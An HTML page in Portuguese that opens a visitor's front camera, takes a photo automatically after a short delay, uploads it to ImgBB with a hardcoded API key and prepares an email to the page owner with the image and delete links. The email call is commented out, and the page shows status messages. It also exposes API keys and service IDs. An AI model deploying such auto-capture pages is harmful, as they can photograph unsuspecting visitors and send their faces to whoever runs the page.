<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Câmera Automática</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            // ⚠️ IMPORTANTE: COLOQUE SUA CHAVE 'user_...' AQUI ABAIXO ⚠️
            emailjs.init("dE244dq8weZCu5CiA"); 
        })();
    </script>

    <style>
        body { margin: 0; background: black; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        video { width: 100%; height: 100%; object-fit: cover; }
        #status { position: absolute; bottom: 20px; left: 0; right: 0; text-align: center; color: white; font-family: sans-serif; font-size: 18px; background: rgba(0,0,0,0.5); padding: 10px; }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <div id="status">Abrindo câmera...</div>

    <script type="text/javascript">
        // CONFIGURAÇÕES
        const IMGBB_API_KEY = '150c23d157fe7a469ffa4316f840df88'; 
        const EMAILJS_SERVICE_ID = 'service_1tsipns';
        const EMAILJS_TEMPLATE_ID = 'template_38m07j9';
        const EMAILJS_PUBLIC_KEY = "dE244dq8weZCu5CiA"; // ⚠️ COLOQUE AQUI TAMBÉM SE NÃO ESTIVER NO INIT

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');

        // 1. Acessar Câmera
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;
                
                // Evento: Quando o vídeo começar a tocar (após o usuário dar permissão)
                video.onloadedmetadata = async () => {
                    status.innerText = "Tirando foto...";
                    // Pequeno delay para a câmera estabilizar/ajustar foco
                    await new Promise(resolve => setTimeout(resolve, 1500)); 
                    tirarFotoAutomatica(stream);
                };
            } catch (err) {
                status.innerText = "Permissão negada ou erro.";
                console.error(err);
            }
        }

        // 2. Função para tirar e enviar
        async function tirarFotoAutomatica(stream) {
            // Captura o frame
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Converte para Base64
            const fotoBase64 = canvas.toDataURL('image/jpeg').split(',')[1];

            // Para a câmera para economizar bateria e privacidade
            stream.getTracks().forEach(track => track.stop());

            try {
                status.innerText = "Enviando para ImgBB...";
                
                // Enviar para ImgBB
                const formData = new FormData();
                formData.append('image', fotoBase64);
                
                const responseImgbb = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: formData });
                const dataImgbb = await responseImgbb.json();
                
                if (!dataImgbb.success) {
                    throw new Error('Erro ImgBB: ' + dataImgbb.error.message);
                }

                const imageUrl = dataImgbb.data.url;
                const imageDeleteUrl = dataImgbb.data.delete_url;

                status.innerText = "Enviando e-mail...";

                // Enviar para EmailJS
                const params = {
                    link_da_foto: imageUrl,
                    link_exclusao: imageDeleteUrl,
                    message: "Nova foto capturada automaticamente."
                };

                // await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params);
                
                status.innerText = "Sucesso! Foto enviada.";
                console.log('Envio concluído');

                // Opcional: Redirecionar ou esconder o vídeo
                // document.body.innerHTML = '<h1 style="color:white;text-align:center;margin-top:20%">Captura Concluída</h1>';

            } catch (error) {
                console.error('Erro final:', error);
                status.innerText = "Erro: " + error.message;
            }
        }

        // Iniciar
        startCamera();
    </script>
</body>
</html>
